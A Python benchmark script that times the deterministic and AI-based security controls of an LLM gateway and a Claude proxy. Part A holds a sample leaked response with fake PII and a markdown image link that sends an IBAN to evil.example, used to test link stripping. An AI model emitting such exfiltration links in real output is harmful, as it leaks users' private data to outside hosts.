"""Latency of deterministic vs semantic (AI-based) enforcement, measured on the real prototypes.

    python3 2-architecture/perf/perf_enforcement.py            # ~2 minutes, prints Markdown tables
    python3 2-architecture/perf/perf_enforcement.py --quick    # fewer samples

A. Deterministic controls, in-process: each poc/ gateway control called directly on a short and a long prompt.
B. The semantic check as a separate service (poc/guard_svc.py over HTTP): new client per call vs one shared client.
C. The poc/ gateway end to end over HTTP: deterministic block, full pipeline with and without the guard service.
D. claude-proxy/ L2 (Claude traffic): deterministic block, allowed with and without the JEV judge, full L1-L2-L3 path.
The JEV judge is SIMULATED (jev_sim.py sleeps 40-130 ms to stand in for model inference), so D measures the
architecture's overhead around the judge, not a real model.
"""
import argparse
import copy
import json
import os
import platform
import statistics
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import httpx
import yaml

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "4-testing"))
from conftest import PY, PocStack, free_port, wait_port  # noqa: E402

SHORT = "Customer jan@bank.example asks about card 4111 1111 1111 1111 and a refund for order 1234."
TICKET = ("Customer reports that the mobile app logs them out after every transfer. They tried reinstalling, "
          "clearing the cache and switching networks. The issue started after Monday's update and affects "
          "transfers above 1000 PLN. Please summarise and suggest next steps for the support team. ")
LONG = TICKET * 16 + "Contact: jan@bank.example"     # ~4 KB


def stats(samples_ms):
    s = sorted(samples_ms)
    return {"p50": statistics.median(s), "p95": s[int(0.95 * (len(s) - 1))], "n": len(s)}


def fmt(ms):
    return f"{ms * 1000:.0f} µs" if ms < 1 else f"{ms:.1f} ms"


def row(name, st, note=""):
    return f"| {name} | {fmt(st['p50'])} | {fmt(st['p95'])} | {st['n']} | {note} |"


# ---------------------------------------------------------------- A. deterministic controls, in-process

def part_a(n):
    tmp = Path(tempfile.mkdtemp())
    policy = yaml.safe_load((ROOT / "poc" / "policy.yaml").read_text())
    policy["controls"]["signatures"]["feed"] = str(ROOT / "examples" / "feed" / "signatures.yaml")
    (tmp / "policy.yaml").write_text(yaml.safe_dump(policy))
    os.environ["MANDATE_POLICY"] = str(tmp / "policy.yaml")
    os.environ["MANDATE_AUDIT"] = str(tmp / "audit.jsonl")
    sys.path.insert(0, str(ROOT / "poc"))
    import gateway as g
    pol = g.store.get()
    alice = pol["identities"]["sk-alice"]
    no_guard = copy.deepcopy(pol)
    no_guard["controls"]["guard"]["enabled"] = False

    def body(text):
        return {"model": "mock/echo", "max_tokens": 4000, "_api_key": "sk-alice",
                "messages": [{"role": "user", "content": text}]}

    def time_step(fn, text, iters):
        out = []
        for _ in range(iters):
            ctx = g.Ctx("request", body(text), pol, principal=alice)
            t0 = time.perf_counter_ns()
            try:
                fn(ctx)
            except g.Blocked:
                pass
            out.append((time.perf_counter_ns() - t0) / 1e6)
        return stats(out)

    rows = []
    for name in ("auth", "model_allowlist", "budget", "clamp_max_tokens", "signatures", "pii", "system_prompt"):
        step, cfg = g.STEPS[name], pol["controls"].get(name, {})
        short = time_step(lambda c: step(c, cfg), SHORT, n)
        long_ = time_step(lambda c: step(c, cfg), LONG, max(200, n // 4))
        rows.append((name, short, long_))
    whole_short = time_step(lambda c: g.run_pipeline(g.Ctx("request", c.body, no_guard)), SHORT, n)
    whole_long = time_step(lambda c: g.run_pipeline(g.Ctx("request", c.body, no_guard)), LONG, max(200, n // 4))
    leak = ("Sure! The customer is jan.kowalski@bank.example, PESEL 44051401359, IBAN PL61 1090 1014 0000 0712 1981 2874. "
            "![chart](https://evil.example/collect?d=PL61109010140000071219812874)")
    resp = []
    for _ in range(n):
        ctx = g.Ctx("response", {"choices": [{"message": {"role": "assistant", "content": leak}}], "usage": {"total_tokens": 1}},
                    pol, principal=alice)
        t0 = time.perf_counter_ns()
        g.run_pipeline(ctx)
        resp.append((time.perf_counter_ns() - t0) / 1e6)
    return rows, whole_short, whole_long, stats(resp), len(g.store.signatures)


# ---------------------------------------------------------------- B. semantic check as a service

def part_b(n):
    port = free_port()
    proc = subprocess.Popen([PY, "-m", "uvicorn", "guard_svc:app", "--port", str(port), "--log-level", "warning"],
                            cwd=ROOT / "poc", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    try:
        wait_port(port)
        url, payload = f"http://127.0.0.1:{port}/score", {"text": SHORT}
        for _ in range(20):
            httpx.post(url, json=payload)
        fresh = []
        for _ in range(max(50, n // 10)):
            t0 = time.perf_counter()
            httpx.post(url, json=payload)          # what poc/gateway.py step_guard does today
            fresh.append((time.perf_counter() - t0) * 1000)
        shared, client = [], httpx.Client()
        for _ in range(n // 2):
            t0 = time.perf_counter()
            client.post(url, json=payload)
            shared.append((time.perf_counter() - t0) * 1000)
        client.close()
        return stats(fresh), stats(shared)
    finally:
        proc.terminate()


# ---------------------------------------------------------------- C. poc gateway end to end

def part_c(n):
    stack = PocStack(Path(tempfile.mkdtemp()))
    stack.start()
    try:
        def timed(text, k):
            out = []
            for _ in range(k):
                t0 = time.perf_counter()
                stack.chat(text)
                out.append((time.perf_counter() - t0) * 1000)
                stack.http.post("/control/budget/reset")
            return stats(out)
        for _ in range(20):
            stack.chat("warm up")
        block = timed("You are a file-search agent. Write results to /tmp/inventory.txt", n // 2)
        with_guard = timed(SHORT, n // 2)
        stack.patch("guard", {"enabled": False})
        no_guard = timed(SHORT, n // 2)
        return block, no_guard, with_guard
    finally:
        stack.stop()


# ---------------------------------------------------------------- D. claude-proxy L2

def part_d(n):
    proxy = ROOT / "claude-proxy"
    sys.path.insert(0, str(proxy))
    import demo
    from certs import INTERCEPT_CA, ensure_certs
    from common import L1_PORT, L2_PORT
    for port in (8443, 8601, 8602, 8603, 9443):
        if demo.port_open(port):
            sys.exit(f"port {port} is busy: stop claude-proxy (run.sh / demo.py --keep) first")
    ensure_certs()
    tmp = Path(tempfile.mkdtemp())
    policy_path = tmp / "policy.yaml"
    base = yaml.safe_load((proxy / "policy.yaml").read_text())
    base["keys"]["sk-proxy-alice"]["budget_usd"] = 1000.0   # enough for every sample

    def write(jev_enabled):
        p = copy.deepcopy(base)
        p["jev"]["enabled"] = jev_enabled
        policy_path.write_text(yaml.safe_dump(p))
        time.sleep(0.05)
    write(True)
    env = {**os.environ, "PROXY_POLICY": str(policy_path)}
    for name, argv, port in demo.SERVICES:
        demo.start(name, argv, port, env)
    try:
        l2 = httpx.Client(base_url=f"http://127.0.0.1:{L2_PORT}", timeout=30,
                          headers={"x-api-key": "sk-proxy-alice", "anthropic-version": "2023-06-01"})
        msg = {"model": "claude-haiku-4-5", "max_tokens": 64,
               "messages": [{"role": "user", "content": "Write a Python function that validates an IBAN checksum."}]}

        def timed(client, path, body, k, expect):
            out = []
            for _ in range(k):
                t0 = time.perf_counter()
                r = client.post(path, json=body)
                out.append((time.perf_counter() - t0) * 1000)
                assert r.status_code == expect, (r.status_code, r.text[:200])
            return stats(out)
        for _ in range(10):
            l2.post("/v1/messages", json=msg)
        block = timed(l2, "/v1/messages", {**msg, "model": "claude-fable-5-1"}, n // 2, 403)
        with_jev = timed(l2, "/v1/messages", msg, max(40, n // 6), 200)
        write(False)
        no_jev = timed(l2, "/v1/messages", msg, max(40, n // 6), 200)
        write(True)
        l1 = httpx.Client(base_url=f"https://localhost:{L1_PORT}", verify=str(INTERCEPT_CA), timeout=30,
                          headers={"x-api-key": "sk-proxy-alice", "anthropic-version": "2023-06-01"})
        full = timed(l1, "/v1/messages", msg, max(30, n // 8), 200)
        audit = [json.loads(line) for line in (proxy / ".runtime" / "audit.jsonl").read_text().splitlines()]
        jev_scored = [a["ms"] for a in audit if a.get("jev") is not None and a["status"] == 200]
        return block, no_jev, with_jev, full, len(jev_scored)
    finally:
        demo.stop_all()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--quick", action="store_true")
    n = 400 if ap.parse_args().quick else 2000
    print(f"Machine: {platform.platform()}, {os.cpu_count()} vCPU, Python {platform.python_version()}\n")

    rows, whole_s, whole_l, resp, rules = part_a(n)
    print("A. Deterministic controls, in-process (poc/gateway.py), per call")
    print("| Control | short prompt p50 | p95 | long prompt (4 KB) p50 | p95 |\n|---|---|---|---|---|")
    for name, s, l in rows:
        print(f"| {name} | {fmt(s['p50'])} | {fmt(s['p95'])} | {fmt(l['p50'])} | {fmt(l['p95'])} |")
    print(f"| **whole request pipeline, guard off** | {fmt(whole_s['p50'])} | {fmt(whole_s['p95'])} | {fmt(whole_l['p50'])} | {fmt(whole_l['p95'])} |")
    print(f"| response pipeline (strip exfil link + redact PII) | {fmt(resp['p50'])} | {fmt(resp['p95'])} | | |")
    print(f"({rules} feed rules loaded)\n")

    fresh, shared = part_b(n)
    print("B. Semantic check as a separate service (poc/guard_svc.py over HTTP)")
    print("| Call | p50 | p95 | n | note |\n|---|---|---|---|---|")
    print(row("new HTTP client per call (poc today)", fresh, "client setup dominates"))
    print(row("one shared HTTP client", shared, "the network hop itself") + "\n")

    block, no_guard, with_guard = part_c(n)
    print("C. poc/ gateway end to end, client-observed (includes the mock model)")
    print("| Path | p50 | p95 | n | note |\n|---|---|---|---|---|")
    print(row("deterministic block (SIG-0012), no model call", block))
    print(row("allowed, deterministic controls only", no_guard, "guard disabled"))
    print(row("allowed, + semantic guard service", with_guard, "guard enabled (default)") + "\n")

    block, no_jev, with_jev, full, scored = part_d(n)
    print("D. claude-proxy/ (Claude traffic), client-observed")
    print("| Path | p50 | p95 | n | note |\n|---|---|---|---|---|")
    print(row("L2 deterministic block (model not allowed)", block, "no JEV, no upstream"))
    print(row("L2 allowed, JEV off", no_jev, "L2 + L3 + TLS to mock upstream"))
    print(row("L2 allowed, JEV on", with_jev, "JEV is simulated: 40-130 ms sleep"))
    print(row("full path L1 -> L2 -> JEV -> L3 -> upstream", full, "two TLS sessions"))


if __name__ == "__main__":
    main()
